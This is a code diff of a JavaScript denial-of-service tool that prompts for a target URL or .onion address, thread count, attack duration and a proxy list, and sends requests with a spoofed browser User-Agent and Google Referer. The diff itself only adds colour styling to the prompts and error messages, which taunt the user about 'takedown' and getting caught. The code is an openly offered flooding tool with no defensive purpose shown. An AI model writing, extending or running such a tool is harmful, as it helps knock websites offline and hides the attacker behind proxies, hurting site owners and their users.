@@ -11,10 +11,10 @@
  // DARK BLUE: #00008B
  
 
- const targetURL = prompt("Enter target URL (e.g., https://example.com or .onion address):", "https://example.com");
- const threads = parseInt(prompt("Enter number of threads (more = faster takedown, but you'll get caught faster, dumbass):", "500"));
- const duration = parseInt(prompt("Enter attack duration in seconds:", "60"));
- const proxyListURL = prompt("Enter URL to proxy list (HTTP/S only, one proxy per line):", "https://example.com/proxies.txt");
+ const targetURL = prompt("%cEnter target URL (e.g., https://example.com or .onion address):", "https://example.com", "color: #008000");
+ const threads = parseInt(prompt("%cEnter number of threads (more = faster takedown, but you'll get caught faster, dumbass):", "500", "color: #008000"));
+ const duration = parseInt(prompt("%cEnter attack duration in seconds:", "60", "color: #008000"));
+ const proxyListURL = prompt("%cEnter URL to proxy list (HTTP/S only, one proxy per line):", "https://example.com/proxies.txt", "color: #008000");
  
 
  console.log("%c[INFO] Target: " + targetURL, "color: #008000");
@@ -42,7 +42,7 @@
    log(`Loaded ${proxies.length} proxies.`);
   } catch (error) {
    log(`Error loading proxies: ${error}`);
-   console.error("FAILED TO LOAD PROXIES. YOU'RE FUCKED IF YOU CONTINUE.");
+   console.error("%cFAILED TO LOAD PROXIES. YOU'RE FUCKED IF YOU CONTINUE.", "color: #8B0000");
   }
  };
  
@@ -63,6 +63,8 @@
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
     'Referer': 'https://www.google.com/'
    };
+ 
+
    const controller = new AbortController();
    const timeoutId = setTimeout(() => {
     controller.abort();
